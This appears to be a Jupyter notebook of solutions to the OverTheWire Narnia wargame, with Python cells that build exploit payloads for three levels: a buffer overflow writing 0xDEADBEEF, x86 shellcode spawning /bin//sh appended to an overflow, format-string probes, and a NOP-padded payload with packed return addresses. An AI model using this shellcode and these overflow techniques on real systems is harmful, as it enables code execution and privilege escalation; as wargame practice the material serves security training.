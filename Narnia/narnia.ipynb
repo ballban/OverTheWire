{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## narnia0\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import struct\n",
    "\n",
    "with open(\"injection123.blob\", \"wb\") as f:\n",
    "    f.write(b\"0\" * 20 + struct.pack(\"<I\", 0xDEADBEEF))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## narnia2\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj1X\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1jFX\\xcd\\x80\\xb0\\x0bRhn/shh//bi\\x89\\xe3\\x89\\xd1\\xcd\\x80'\n"
     ]
    }
   ],
   "source": [
    "print(\n",
    "    b\"\\x41\" * 130\n",
    "    + b\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## narnia5\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"%x\" * 64\n",
    "\n",
    "for i in range(64):\n",
    "    print(f\"%{i}$x\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xd6\\xd5\\xff\\xff'\n",
      "b'\\xa0\\xd5\\xff\\xff'\n",
      "b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xd6\\xd5\\xff\\xff\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xa0\\xd5\\xff\\xffj1X\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1jFX\\xcd\\x80\\xb0\\x0bRhn/shh//bi\\x89\\xe3\\x89\\xd1\\xcd\\x80' 74\n"
     ]
    }
   ],
   "source": [
    "padding = b\"\\x90\" * 20\n",
    "shellcode = b\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\"\n",
    "\n",
    "blah_addr = 0xFFFFD5D6\n",
    "blah = struct.pack(\"<I\", blah_addr)\n",
    "target = struct.pack(\"<I\", blah_addr - 4 - 12 - 4 - len(shellcode))\n",
    "\n",
    "payload = padding + blah + b\"\\x90\" * 12 + target + shellcode\n",
    "\n",
    "print(blah)\n",
    "print(target)\n",
    "print(payload, len(payload))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xb8\\xd5\\xff\\xff'\n",
      "b'\\xb4\\xd5\\xff\\xff'\n"
     ]
    }
   ],
   "source": [
    "print(struct.pack(\"<I\", 0xFFFFD5B8))\n",
    "print(struct.pack(\"<I\", 0xFFFFD5B8 - 4))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "34\n"
     ]
    }
   ],
   "source": [
    "print(len(shellcode))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x86\\xd5\\xff\\xff'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "struct.pack(\"<I\", 0xFFFFD5B4 - 4 - 8 - 34)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
